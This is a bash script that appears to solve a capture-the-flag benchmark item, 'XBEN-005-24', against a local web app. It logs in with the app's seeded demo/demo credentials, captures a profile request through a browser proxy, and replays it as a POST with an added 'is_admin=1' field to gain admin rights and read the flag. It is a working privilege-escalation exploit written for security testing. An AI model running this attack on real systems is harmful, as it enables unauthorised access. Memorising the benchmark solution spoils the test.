#!/usr/bin/env bash
# XBEN-005-24 — "Simple IDOR POST" (tags: idor, jwt, default_credentials)
#
# Proxy-mode twin of examples/xben/xben-005-idor-post-privesc.sh. The attack is
# the same: log in with the seeded demo account, submit the profile form once so
# the real POST is captured, then replay it with an `is_admin` field the form
# never offered. The server validates the token but not the field set, so the
# added field sticks; admin accounts see the private jobs, one of which is the
# flag.
#
# The difference is the capture path: a real Chromium driven by agent-browser
# through `h5i browser proxy`, rather than h5i's own `browser open --capture`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben005p-$$"
cd "$(dirname "$0")"
. ./_proxy-lib.sh

# 1. Capture proxy up, Chromium pointed at it.
proxy_start "$URL/"

# 2. Log in. `demo`/`demo` is the account the application seeds. Wait for the
#    post-login page so the auth cookie is set before anything else is sent.
go "$URL/"
ab wait '#username' >/dev/null 2>&1 || true
ab fill '#username' demo >/dev/null
ab fill '#password' demo >/dev/null
ab click 'button[type=submit]' >/dev/null
ab wait --url 'company' >/dev/null 2>&1 || true

# 3. Open the profile editor. This GET is captured with the right cookie, so it
#    is the request to attack: the editor's POST goes to this same URL.
go "$URL/edit_profile/1"

# 4. Replay that request as the profile-update POST, with the `is_admin` field
#    the form never offers. The server validates the token but not the field
#    set, so the added field sticks. `--create` is required because the fields
#    are not there to change; without it h5i refuses rather than invent them.
REQ="$(req_of GET edit_profile)"
"$H5I" websec replay "$REQ" --session "$SESSION" \
  --set method=POST \
  --set 'header.content-type=application/x-www-form-urlencoded' \
  --set '+form.name=demo' --set '+form.is_admin=1' >/dev/null

# 5. Admin now, so the company jobs page carries the private entries — and the
#    flag. The jobs GET captured at login predates the privilege change, so
#    re-send it (now that the account is admin) and read the flag from the fresh
#    response.
JOBS_REQ="$(req_of GET 'company/1/jobs')"
flag="$(replay_flag "$JOBS_REQ")"
if [ -n "$flag" ]; then printf '%s\n' "$flag"; else print_flag; fi
